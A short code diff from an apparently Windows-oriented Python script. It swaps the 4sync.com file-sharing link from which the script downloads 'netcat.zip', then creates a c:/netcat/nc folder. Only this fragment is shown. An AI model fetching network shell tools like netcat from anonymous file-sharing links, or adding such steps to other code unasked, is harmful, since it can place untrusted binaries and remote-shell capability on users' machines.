@@ -43,7 +43,7 @@ def download(downloadUrl):
 
             print(f'{blue}download of netcat.zip completed{stop}')
 
-download('https://www.4sync.com/web/directDownload/5tN-u-WN/CggsuJhW.3d8b4d661fba390bdf488d4b1dafb910')
+download('https://www.4sync.com/web/directDownload/aNHtMRp8/CggsuJhW.bdb188ac3bdd769e50388897cadb0c05')
 
 os.chdir('c:/netcat')
 os.mkdir('c:/netcat/nc')
